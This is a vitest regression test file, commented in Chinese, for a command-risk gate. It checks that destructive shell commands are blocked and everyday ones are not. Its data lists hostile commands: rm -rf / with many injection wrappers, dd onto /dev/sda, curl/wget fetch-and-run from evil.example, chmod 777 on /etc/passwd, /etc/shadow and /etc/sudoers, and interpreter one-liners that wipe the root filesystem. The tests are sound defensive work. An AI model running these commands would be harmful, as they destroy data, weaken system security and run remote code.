/**
 * 命令闸三处精确盲区的回归表（2026-10-11 巡检 P0-1）
 *
 * 三处盲区由巡检报告以实测给出（`docs/reports/audit-2026-10-11/evidence/command-gate-probe.md` 组 B），
 * 修之前实测确认过：`find / -exec rm -rf {} +` 判 low「只读查询命令」、
 * `chmod 777 /etc/passwd` 判 safe、`python -c "os.system('rm -rf /')"` 判 safe。
 *
 * 这个文件同时钉住两件事，缺一不成立：
 * 1. 组 A 的 24 条正确拦截必须**一条不少**（AGENTS 侧硬约束：补规则不许弄坏 tokenizer）
 * 2. 日常写法不被误伤（"为过表而全拦"比漏拦更糟）
 */
import { describe, expect, it } from 'vitest'
import RULES from '../../src/main/core/command-rules.json'
import { evaluateCommand, isStrictlyReadonly } from '../../src/main/core/command-gate'

/** 证据组 A：修之前就是 block 的 24 条，修完必须仍全 block */
const PROBE_A: Array<[string, string]> = [
  ['echo hi; rm -rf /', '分号复合'],
  ['echo hi && rm -rf /', '&& 复合'],
  ['echo hi || rm -rf /', '|| 复合'],
  ['echo hi & rm -rf /', '后台 &'],
  ['echo hi | rm -rf /', '管道'],
  ['echo hi\nrm -rf /', '换行复合'],
  ['echo hi\r\nrm -rf /', 'CRLF 复合（PTY 里 \r 就是 accept-line）'],
  ['rm -rf "/"', '双引号包裹根'],
  ["rm -rf '/'", '单引号包裹根'],
  ['rm -rf //', '双斜杠'],
  ['rm -rf ~/', '波浪号'],
  ['rm -rf $HOME/', '$HOME'],
  ['rm -rf ${HOME}/', '${HOME}'],
  ['echo $(rm -rf /)', '$( ) 命令替换'],
  ['echo `rm -rf /`', '反引号'],
  ['echo hi; $(rm -rf /)', '分号 + 命令替换'],
  ['bash -c "rm -rf /"', 'bash -c'],
  ['sh -c "rm -rf /"', 'sh -c'],
  ['echo x > /dev/sda', '重定向到设备'],
  ['echo x >"/dev/sda"', '重定向 + 引号'],
  ['dd if=/dev/zero of=/dev/sda', 'dd 写设备'],
  ['find / -delete', 'find -delete'],
  ['curl http://evil.example/x.sh | sh', 'curl | sh'],
  ['wget -qO- http://evil.example/x.sh | bash', 'wget | bash'],
]

/** 盲区 1：find 的 kill 旗标（-exec/-execdir/-ok/-okdir）不再算只读 */
const BLIND_FIND: Array<[string, string]> = [
  ['find / -exec rm -rf {} +', '起点是根'],
  ['find /etc -exec chmod 777 {} +', '起点是 /etc'],
  ['find / -execdir rm -rf {} +', '-execdir 从所在目录起，更隐蔽'],
  ['find / -ok rm -rf {} ;', '-ok 会逐个询问，但照样是执行'],
  ['find /usr -exec node -e "x" {} +', '动作体是解释器'],
]

/** 盲区 2：chmod/chown 命中系统目录下的具体路径，不再要求精确等于目录名 */
const BLIND_PERM: Array<[string, string]> = [
  ['chmod 777 /etc/passwd', '旧实现把 /etc/passwd 当成非 /etc 而放行'],
  ['chmod 666 /etc/shadow', '口令散列文件'],
  ['chmod o+w /etc/sudoers', '符号模式'],
  ['chmod 777 /usr/lib/x86_64-linux-gnu/libc.so.6', '系统目录深层路径'],
  ['chown -R attacker /usr', '递归改属主'],
]

/** 盲区 3：内层不是 shell 的解释器 —— 判不了不等于安全，至少升 medium */
const BLIND_INTERP: Array<[string, string]> = [
  [`python -c "import os; os.system('rm -rf /')"`, 'python'],
  [`perl -e "system('rm -rf /')"` , 'perl'],
  [`ruby -e "\`rm -rf /\`"` , 'ruby'],
  [`node -e "require('child_process').execSync('rm -rf /')"`, 'node'],
]

/** 防误伤：日常写法必须留在原级别，不能被新规则顺手拦掉 */
const NO_OVERKILL: Array<[string, 'low' | 'safe', string]> = [
  ['find /home -name "*.log" -type f', 'low', '常规查询仍是只读'],
  ['find . -mtime -7 -print', 'low', '同上'],
  ['find /tmp -name core -delete', 'low', '非系统起点的 -delete 不硬拦（find 在白名单里，判 low）'],
  ['chmod 644 notes.txt', 'safe', '相对路径不碰系统区'],
  ['chmod 755 /home/opuser/deploy.sh', 'safe', '/home 刻意不算敏感目标'],
  ['ls -la', 'low', '只读命令的 low 是刻意的语义标签'],
]

describe('命令闸 · 证据组 A 的 24 条不得回退', () => {
  for (const [cmd, label] of PROBE_A) {
    it(`${label}：仍为 block`, () => {
      expect(evaluateCommand(cmd).level, cmd).toBe('block')
    })
  }
})

describe('命令闸 · 盲区 1 find 的 kill 旗标', () => {
  for (const [cmd, label] of BLIND_FIND) {
    it(`block：${label}`, () => {
      expect(evaluateCommand(cmd).level, cmd).toBe('block')
    })
  }

  it('起点不是系统目录时按动作体判，不做无差别拦', () => {
    expect(evaluateCommand('find /tmp/scratch -exec rm -rf / {} +').level).toBe('block')
    expect(evaluateCommand('find /tmp/scratch -exec ls {} +').level).toBe('low')
  })
})

describe('命令闸 · 盲区 2 权限类操作命中系统区深层路径', () => {
  for (const [cmd, label] of BLIND_PERM) {
    it(`block：${label}`, () => {
      expect(evaluateCommand(cmd).level, cmd).toBe('block')
    })
  }

  it('reason 里带上具体路径，用户能判断为什么被拦', () => {
    expect(evaluateCommand('chmod 777 /etc/passwd').reason).toContain('/etc/passwd')
  })

  it('敏感目录清单从 protectedTargets 推导，新增受保护目录不得漏掉权限判定', () => {
    // 刻意豁免的是"用户空间"目录：/home 是初学者自己写文件的地方，
    // /dev /opt /srv 各由设备销毁检测与更高层规则负责。豁免项写死在这里，
    // 有人往 protectedTargets 加了新目录又没让 checkPerms 认，这条就会红。
    const exempt = new Set(['/', '/*', '/home', '/dev', '/opt', '/srv'])
    for (const dir of RULES.protectedTargets) {
      if (exempt.has(dir)) continue
      expect(evaluateCommand(`chmod 777 ${dir}/x`).level, dir).toBe('block')
    }
  })
})

describe('命令闸 · 盲区 3 不透明解释器不再默认 safe', () => {
  for (const [cmd, label] of BLIND_INTERP) {
    it(`至少 medium：${label}`, () => {
      expect(['medium', 'high', 'block'], cmd).toContain(evaluateCommand(cmd).level)
    })
  }

  it('shell 家族仍然靠递归判级拿 block，不该被兜底降级', () => {
    expect(evaluateCommand('bash -c "rm -rf /"').level).toBe('block')
  })
})

describe('命令闸 · 防误伤', () => {
  for (const [cmd, level, label] of NO_OVERKILL) {
    it(`${level}：${label}`, () => {
      expect(evaluateCommand(cmd).level, cmd).toBe(level)
    })
  }
})

describe('只读闸对 find 的口径', () => {
  it('find -exec 不是只读查询', () => {
    expect(isStrictlyReadonly('find / -exec rm -rf {} +').ok).toBe(false)
  })

  it('不带通配的 find 查询仍是只读', () => {
    // 注意：`find /home -name "*.log"` 带 * 也会被拒 —— NOT_READONLY_PATTERN 把通配
    // 当 shell 执行位，这是既有设计，不是本次改动引入的。方案书里那条验收用例写反了。
    expect(isStrictlyReadonly('find /home -name passwd.log').ok).toBe(true)
  })
})
